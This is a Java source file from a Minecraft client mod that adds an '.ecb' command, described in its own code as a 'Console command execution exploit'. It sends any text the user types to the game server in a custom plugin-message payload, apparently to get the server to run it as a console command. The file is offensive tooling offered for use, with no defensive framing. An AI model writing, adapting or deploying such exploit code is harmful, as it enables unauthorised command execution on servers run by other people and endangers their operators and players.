package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientfabric.packet.ECBPayloadPacket;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class ECBCommand extends Command {
    private final ExecutorService executor = Executors.newCachedThreadPool();
    private long lastSentTime = 0;
    private static final long COOLDOWN_MS = 2000;

    public ECBCommand() {
        super("ecb", "Console command execution exploit");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(ctx -> {
            Helper.printChatMessage("§cUsage: .ecb <command>");
            return SINGLE_SUCCESS;
        }).then(argument("command", StringArgumentType.greedyString())
                .executes(ctx -> {
                    String command = ctx.getArgument("command", String.class);
                    long currentTime = System.currentTimeMillis();

                    if (currentTime - lastSentTime < COOLDOWN_MS) {
                        Helper.printChatMessage("§eWait before sending another payload...");
                        return SINGLE_SUCCESS;
                    }

                    lastSentTime = currentTime;

                    executor.submit(() -> {
                        try {
                            String uniqueId = Integer.toHexString((int) (Math.random() * 0xFFFFFF));
                            Helper.printChatMessage("§7Sending ECB payload: §f" + command + " §8[ID: " + uniqueId + "]");

                            ECBPayloadPacket payload = new ECBPayloadPacket(command);
                            Helper.sendPacket(new CustomPayloadC2SPacket(payload));

                            Helper.printChatMessage("§aECB payload dispatched!");
                        } catch (Exception e) {
                            Helper.printChatMessage("§cFailed to send ECB payload: " + e.getMessage());
                        }
                    });

                    return SINGLE_SUCCESS;
                })
        );
    }
}
